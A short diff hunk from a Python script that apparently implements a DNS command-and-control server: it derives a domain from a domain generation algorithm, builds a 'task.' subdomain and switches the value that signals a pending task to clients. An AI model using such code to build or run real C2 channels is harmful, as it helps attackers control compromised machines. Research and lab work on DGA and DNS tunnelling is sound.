@@ -77,8 +77,8 @@ def respond_dns(reply, addr):
 dga_domain = dga(seed="1533254400")
 print(dga_domain)
 ask_task = "task." + dga_domain + "."
-#give_task = '1.1' #switch from 1's to indicate task is coming
-give_task = '2.5'
+give_task = '1.1' #switch from 1's to indicate task is coming
+#give_task = '2.5'
 
 
 #Create a UDP socket object
